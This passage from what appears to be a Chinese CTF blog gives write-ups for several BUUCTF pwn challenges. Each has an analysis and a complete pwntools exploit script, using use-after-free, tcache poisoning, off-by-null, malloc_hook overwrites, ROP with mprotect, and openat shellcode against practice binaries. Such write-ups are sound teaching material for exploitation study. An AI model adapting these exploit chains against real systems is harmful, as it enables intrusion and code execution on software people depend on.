handler函数的最后一条ret指令会使得执行流跳转到这段sigreturn代码，被动地进行sigreturn系统调用,把原来保存的寄存器信息弹回去，最后恢复进程的执行。</p><p>由此可以得出，因为程序是主动调用sigreturn的，并不需要<code>rt_sigreturn</code>指向一段代码，再调用sigreturn系统调用。</p><h2 id="ciscn-2019-final-4"><a href="#ciscn-2019-final-4" class="headerlink" title="ciscn_2019_final_4"></a><code>ciscn_2019_final_4</code></h2><p>这个题还是很好的题目，考察了很多的基础知识点。</p><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><ul><li>开启了沙盒禁用execve</li><li>开头让你输入name，有一段可控的栈空间，且较大</li><li>pie保护没有开</li><li>存在反调试，使用ptrace做的，直接gdb attach过去会进入子程序，看不到堆情况(直接在fork 汇编处，改汇编，<code>jmp 到程序输出字符串的地方即可</code> )</li><li>watch函数中也用ptrace，监视了<code>open，mmap，fork，vfork，ptrace</code> </li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    ptrace(PTRACE_SYSCALL, a1, <span class="hljs-number">0L</span>L, <span class="hljs-number">0L</span>L);    waitpid(a1, &amp;stat_loc, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> ( !(stat_loc &amp; <span class="hljs-number">0x7F</span>) || (<span class="hljs-keyword">char</span>)((<span class="hljs-keyword">char</span>)((stat_loc &amp; <span class="hljs-number">0x7F</span>) + <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>) &gt; <span class="hljs-number">0</span> || (stat_loc &amp; <span class="hljs-number">0xFF00</span>) &gt;&gt; <span class="hljs-number">8</span> != <span class="hljs-number">5</span> )      <span class="hljs-keyword">break</span>;    ptrace(PTRACE_GETREGS, a1, <span class="hljs-number">0L</span>L, &amp;v3);    v2 = v4;    <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-number">2</span> || v2 == <span class="hljs-number">9</span> || v2 == <span class="hljs-number">0x39</span> || v2 == <span class="hljs-number">0x3A</span> || v2 == <span class="hljs-number">0x65</span> )    &#123;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"hey! what are you doing?"</span>);      <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;  &#125;</code></pre></div><p>这里可以监视一下execve，好像就可以不用开沙箱了。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>存在uaf</p><h3 id="难点-1"><a href="#难点-1" class="headerlink" title="难点"></a>难点</h3><h4 id="orw的rop-chain往哪里读"><a href="#orw的rop-chain往哪里读" class="headerlink" title="orw的rop chain往哪里读"></a>orw的rop chain往哪里读</h4><p>程序自身是存在较少的gadgets的，想直接完成orw 的rop chain，是不可能的。<br>上来因为没开pie，能简单的完成一个read功能。在泄漏libc以后，就有更大的发挥空间了。</p><p>开头name有一大块可控地址，该怎么使用上。先输入一段垃圾数据，留着寻找。</p><div class="hljs"><pre><code class="hljs python">sa(<span class="hljs-string">'name'</span>,<span class="hljs-string">'chumen77'</span>*<span class="hljs-number">10</span>)</code></pre></div><p>在控制malloc hook后，随意写个地址，让其crash在这里，查看下栈地址：</p><div class="hljs"><pre><code class="hljs python">data = <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0xdeadbeef</span>)add(<span class="hljs-number">0x68</span>,data)</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/JsY1bN.png" srcset="/img/loading.gif" alt><br>发现断在0xdeadbeef，栈上可以看到输入的name情况。</p><p>此处来一个栈劫持，增加rsp 指针0x38 ，接着ret上去，就可以执行name上的东西，这个东西肯定写成仅能完成的read rop chain。</p><p>因为pie没开，可以使用这个新的read 在bss段上读取一个新的rop chain，接着ret 上去执行。新的rop chain，可以为mprotect解开bss段的执行权限，接着跳上orw flag的shellcode即可。（<strong>mprotect 需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。 这里直接设置为bss起始地址即可。</strong>）</p><h4 id="open被禁用了怎么办"><a href="#open被禁用了怎么办" class="headerlink" title="open被禁用了怎么办"></a>open被禁用了怎么办</h4><p>可以使用openat进行代替。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span> <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag, <span class="hljs-keyword">mode_t</span> mode)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">openat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *path, <span class="hljs-keyword">int</span> oflag,  <span class="hljs-keyword">mode_t</span> mode )</span></span>;        <span class="hljs-comment">//函数执行成功返回文件描述符，失败返回-1.</span></code></pre></div><p><a href="https://blog.csdn.net/liangzc1124/article/details/83475246" target="_blank" rel="noopener">https://blog.csdn.net/liangzc1124/article/details/83475246</a></p><p><a href="https://www.cnblogs.com/BinBinStory/p/7400993.html" target="_blank" rel="noopener">https://www.cnblogs.com/BinBinStory/p/7400993.html</a></p><p>其中重点就是，当openat的path参数，输入是绝对地址时，fd就会被无视，其函数就相当于open了。所以此处的fd，也是可以设成任意值。</p><h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_final_4'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25080</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))        sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))bss = <span class="hljs-number">0x6021C0</span>pop_rdi = <span class="hljs-number">0x0000000000401193</span>pop_rsi_r15 = <span class="hljs-number">0x0000000000401191</span>pop_rsp_r13_r14_r15 = <span class="hljs-number">0x000000000040118d</span>orw = flat([pop_rdi,<span class="hljs-number">0</span>,pop_rsi_r15,bss + <span class="hljs-number">0x400</span>,<span class="hljs-number">0</span>,elf.plt[<span class="hljs-string">'read'</span>],pop_rsp_r13_r14_r15,bss + <span class="hljs-number">0x400</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>])sa(<span class="hljs-string">'name'</span>,str(orw))<span class="hljs-comment"># sa('name','chumen77'*10)</span>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'2'</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'3'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'4'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'5'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">3</span>)free(<span class="hljs-number">2</span>)malloc_hook = <span class="hljs-number">0x3c4afd</span> + libcbaseadd(<span class="hljs-number">0x68</span>,p64(malloc_hook))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'7'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'8'</span>)rsp_add_0x38 = libc.search(asm(<span class="hljs-string">"add rsp , 0x38\nret"</span>)).next()data = <span class="hljs-number">3</span> * <span class="hljs-string">'\x00'</span> + p64(rsp_add_0x38 + libcbase)<span class="hljs-comment"># data = 3 * '\x00' + p64(0xdeadbeef)</span>add(<span class="hljs-number">0x68</span>,data)<span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size'</span>,<span class="hljs-string">'20'</span>)sleep(<span class="hljs-number">0.2</span>)pop_rdx = libcbase + libc.search(asm(<span class="hljs-string">"pop rdx\nret"</span>)).next()pop_rsp = libcbase + libc.search(asm(<span class="hljs-string">"pop rsp\nret"</span>)).next()mprotect = libcbase + libc.sym[<span class="hljs-string">'mprotect'</span>]payload = flat([pop_rdi,<span class="hljs-number">0x00602000</span>,pop_rsi_r15,<span class="hljs-number">0x1000</span>,<span class="hljs-number">0</span>,pop_rdx,<span class="hljs-number">7</span>,mprotect,<span class="hljs-number">0x602628</span>])shellcode = shellcraft.linux.openat(<span class="hljs-number">0</span>,<span class="hljs-string">'/flag'</span>,<span class="hljs-number">0</span>) + shellcraft.linux.read(<span class="hljs-number">3</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>) + shellcraft.linux.write(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x200</span>,<span class="hljs-number">0x30</span>)sleep(<span class="hljs-number">0.2</span>)s(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + payload + p64(<span class="hljs-number">0</span>) + asm(shellcode))<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="延伸做法"><a href="#延伸做法" class="headerlink" title="延伸做法"></a>延伸做法</h3><p><a href="https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/" target="_blank" rel="noopener">https://n132.github.io/2019/12/08/2019-12-08-UAF-With-Out-One_gadget/</a></p><p>其是用<code>house_of_orange+setcontext+0x35</code>调用read传入ropchain来完成攻击。</p><p>如果无法控制<code>free_hook</code>且在libc-2.23情况下可以利用这个办法。</p><h2 id="sctf-2019-one-heap"><a href="#sctf-2019-one-heap" class="headerlink" title="sctf_2019_one_heap"></a><code>sctf_2019_one_heap</code></h2><h3 id="分析-14"><a href="#分析-14" class="headerlink" title="分析"></a>分析</h3><ul><li>不可指定idx，来操作chunk，只能操作当前malloc 分配chunk对应的heap地址</li><li>只有free 和 add，free可以4次，add可以<code>0xf</code>次</li></ul><h3 id="难点-2"><a href="#难点-2" class="headerlink" title="难点"></a>难点</h3><ul><li>无show函数</li><li>有限的free次数，只能通过合适的堆技巧或者爆破来完成攻击</li></ul><p>此题由于只能4次free，其中3次free还是直接必须执行的，只剩下的一次就尤为关键。目标就是在其free以后，有办法让再次申请的chunk可以修改到这个free chunk对应tcache bin的fd，来进行tcache attack。</p><p>当一个堆A同时在tcache里面，又在unsortbin里面，这种情况是常见的，并且也是危险的。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/T5GJ9H.png" srcset="/img/loading.gif" alt></p><p>当先申请一个小的chunk C，其肯定是在此chunk上按照unsortbin的规则，分割一下，留下一个小的unsortbin bin。<br><img src="http://qiqianyun.chumen77.xyz/uPic/yB8mNI.png" srcset="/img/loading.gif" alt></p><p>然后接着申请一个相同于chunk A大小的堆，就有机会改到这个2个被分割完的小chunk。<strong>比如改0x61的unsortbin的信息，可以改其size，并且提前在chunk B处伪造好数据，即可完成一个fake 的 unsortbin。</strong></p><p> <img src="http://qiqianyun.chumen77.xyz/uPic/pCToHT.png" srcset="/img/loading.gif" alt></p><p>倘若再申请一个合适的大小，比如0x68，即可改到chunk B的数据。此题也就是改其fd指针，即可接着完成tcache attack。</p><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./sctf_2019_one_heap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]roc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_addr</span><span class="hljs-params">()</span>:</span>    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\n'</span>)    free()    free()    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    <span class="hljs-comment">#夹在top chunk前面，防止进入unsortbin时直接合并。并且fake一些数据，留着绕过后面的检查。</span>    add(<span class="hljs-number">0x30</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span>+p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0x20</span>))    free()    add(<span class="hljs-number">0x7f</span>,<span class="hljs-string">'\n'</span>)    free()    add(<span class="hljs-number">0x28</span>,p16(<span class="hljs-number">0x9750</span>) + <span class="hljs-string">'\n'</span>)    debug()    <span class="hljs-comment"># 修改剩下0x60大小的unsortbin的大小为0x90，且前面已经有fake的数据，不会让程序crush</span>    add(<span class="hljs-number">0x7f</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x91</span>) +<span class="hljs-string">'\n'</span>)    payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xfbad3c80</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">'\x00'</span>    add(<span class="hljs-number">0x7f</span>,payload + <span class="hljs-string">'\n'</span>)leak = <span class="hljs-number">0</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">try</span>:        leak_addr()        ss = io.recvuntil(chr(<span class="hljs-number">0x7f</span>),timeout = <span class="hljs-number">0.5</span>)        <span class="hljs-keyword">if</span> len(ss) == <span class="hljs-number">0</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        io.recv(<span class="hljs-number">16</span>)        leak = u64(io.recv(<span class="hljs-number">8</span>))        <span class="hljs-keyword">if</span> leak == <span class="hljs-number">0x320a6464412e310a</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">''</span>)        <span class="hljs-keyword">break</span>    <span class="hljs-keyword">except</span> Exception:        io.close()        io = process(<span class="hljs-string">'./sctf_2019_one_heap'</span>)        <span class="hljs-comment"># io = remote('node3.buuoj.cn',28690)</span>        <span class="hljs-keyword">continue</span>leak = leak &gt;&gt; <span class="hljs-number">16</span>info_addr(<span class="hljs-string">'leak'</span>,leak)libc_base = leak - <span class="hljs-number">4110208</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = <span class="hljs-number">0x3ebc30</span> + libc_basepayload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0x41</span>) + p64(malloc_hook<span class="hljs-number">-8</span>)debug()<span class="hljs-comment"># 修改0x40 tcache bin的chain</span>add(<span class="hljs-number">0x68</span>,payload)debug()add(<span class="hljs-number">0x38</span>,<span class="hljs-string">'\n'</span>)realloc=libc_base+libc.symbols[<span class="hljs-string">'realloc'</span>] + roc[<span class="hljs-number">1</span>]one = <span class="hljs-number">0x10a38c</span> + libc_basepayload = p64(one) + p64(realloc)add(<span class="hljs-number">0x38</span>,payload + <span class="hljs-string">'\n'</span>)add(<span class="hljs-number">0x20</span>,<span class="hljs-string">'\n'</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h2 id="ciscn-2019-es-4"><a href="#ciscn-2019-es-4" class="headerlink" title="ciscn_2019_es_4"></a><code>ciscn_2019_es_4</code></h2><h3 id="分析-15"><a href="#分析-15" class="headerlink" title="分析"></a>分析</h3><p>利用off by null，构造chunk overlapping，然后tcache attack即可。</p><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./ciscn_2019_es_4'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26094</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sl(<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sl(<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sleep(<span class="hljs-number">0.1</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sl(<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))    sleep(<span class="hljs-number">0.1</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>) add(<span class="hljs-number">2</span>,<span class="hljs-number">0xa8</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">'\n'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     add(i+<span class="hljs-number">4</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     free(i+<span class="hljs-number">4</span>)     add(i+<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">'\n'</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):     free(i+<span class="hljs-number">4</span>)free(<span class="hljs-number">0</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xa0</span>+p64(<span class="hljs-number">0x1e0</span>))free(<span class="hljs-number">3</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x80</span>+p64(<span class="hljs-number">0x90</span>)+p64(<span class="hljs-number">0xa0</span>)+p64(<span class="hljs-number">0x00000000006022B0</span>))add(<span class="hljs-number">4</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>)*<span class="hljs-number">2</span>)add(<span class="hljs-number">6</span>,<span class="hljs-number">0x98</span>,<span class="hljs-string">'\n'</span>)show(<span class="hljs-number">6</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebc0a</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)free(<span class="hljs-number">6</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">7</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">15</span>+p64(<span class="hljs-number">0xb1</span>)+p64(<span class="hljs-number">0x3ed8e8</span>+libcbase))add(<span class="hljs-number">8</span>,<span class="hljs-number">0xa0</span>,<span class="hljs-string">'\n'</span>)add(<span class="hljs-number">9</span>,<span class="hljs-number">0xa0</span>,p64(libcbase+rce18[<span class="hljs-number">1</span>]))free(<span class="hljs-number">8</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;BUUCTF刷题记录&quot;&gt;&lt;a href=&quot;#BUUCTF刷题记录&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF刷题记录&quot;&gt;&lt;/a&gt;BUUCTF刷题记录&lt;/h1&gt;&lt;h2 id=&quot;GKCTF-2020-demo&quot;&gt;&lt;a href=&quot;#GKCTF-
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ciscn 2020 华中分区赛部分wp</title>
    <link href="http://chumen77.xyz/2020/09/24/ciscn%202020%20%E5%8D%8E%E4%B8%AD%E5%88%86%E5%8C%BA%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/09/24/ciscn 2020 华中分区赛部分wp/</id>
    <published>2020-09-24T00:09:06.574Z</published>
    <updated>2020-09-26T12:18:50.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2020-华中分区赛部分wp"><a href="#ciscn-2020-华中分区赛部分wp" class="headerlink" title="ciscn  2020 华中分区赛部分wp"></a>ciscn  2020 华中分区赛部分wp</h1><p>第一天跟6级冲突了，基本没玩，第二天做完一个题ida炸了，怎么也打不开。最近，总是关键时刻掉链子了😭。</p><h2 id="logic-mistake"><a href="#logic-mistake" class="headerlink" title="logic_mistake"></a><code>logic_mistake</code></h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>可以申请16个堆，size信息放在其chunk地址的下8个字节</li><li>通过strdup来进行申请堆， <code>strdup</code> 相当于<code>s = input() malloc(stren(s))</code> </li></ul><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4><ul><li><code>read(0, *((void **)&amp;unk_202060 + 2 * v1), dword_202068[4 * v1]);</code> 这里由于是这样的判断，结合add的<code>strdup</code> 就造成了堆溢出。</li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>申请8个0x90大小的堆块，size 填成0xff，留着溢出</li><li>申请3个0x80大小的堆块，size 填成0xff，留着溢出</li><li>释放前8个堆，最后一个进入unsortbin</li><li>申请一个0x90的堆块，会申请到tcache的头的堆，也就是第7个堆</li><li>edit溢出修改到next chunk的size 和prev size，让show 出libc信息</li><li>接着修改unsortbin的size 为0x80，开始进行tcache attack，也就是溢出修改tcache chian上的堆地址，修改为free hook</li><li>然后申请堆到free hook，打one gadgets<h3 id="exp"><a href="#exp" 